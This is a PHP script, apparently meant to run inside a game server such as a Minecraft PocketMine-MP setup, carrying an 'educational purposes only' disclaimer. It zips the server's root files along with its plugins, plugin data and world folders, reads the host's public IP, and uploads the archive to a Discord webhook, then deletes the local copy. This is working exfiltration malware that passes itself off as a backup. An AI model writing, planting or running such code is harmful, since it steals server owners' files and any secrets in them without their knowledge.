<?php

/**
 * This code is provided for educational purposes only.
 * The author does NOT endorse or condone malicious use.
 * Use at your own risk. The author is not responsible for any damage or abuse.
 */

$webhook = "discord webhook url here";
$rootPath = getcwd();
$includeDirs = ['plugins', 'plugin_data', 'worlds'];
$zipPath = sys_get_temp_dir() . "/backup_" . date("Ymd_His") . ".zip";

$zip = new ZipArchive();
if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
    return;
}

$rootLen = strlen($rootPath) + 1;

foreach (scandir($rootPath) as $item) {
    if ($item === '.' || $item === '..') continue;
    $fullPath = $rootPath . DIRECTORY_SEPARATOR . $item;
    if (is_file($fullPath)) {
        $zip->addFile($fullPath, $item);
    }
}

foreach ($includeDirs as $dir) {
    $dirPath = $rootPath . DIRECTORY_SEPARATOR . $dir;
    if (!is_dir($dirPath)) continue;

    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dirPath, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::LEAVES_ONLY
    );

    foreach ($iterator as $file) {
        if ($file->isFile()) {
            $filePath = $file->getRealPath();
            $relativePath = substr($filePath, $rootLen);
            $zip->addFile($filePath, $relativePath);
        }
    }
}

$zip->close();

$_curl = curl_init("https://api.ipify.org");
curl_setopt_array($_curl, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYHOST => 0,
    CURLOPT_SSL_VERIFYPEER => 0,
]);

$ip = curl_exec($_curl);

$curl = curl_init($webhook);
curl_setopt_array($curl, [
    CURLOPT_POST => true,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_HTTPHEADER => [
        "Content-Type: multipart/form-data"
    ],
    CURLOPT_POSTFIELDS => [
        "payload_json" => json_encode(["username" => $ip]),
        "file" => new CURLFile($zipPath)
    ],
]);

$response = curl_exec($curl);
curl_close($curl);
unlink($zipPath);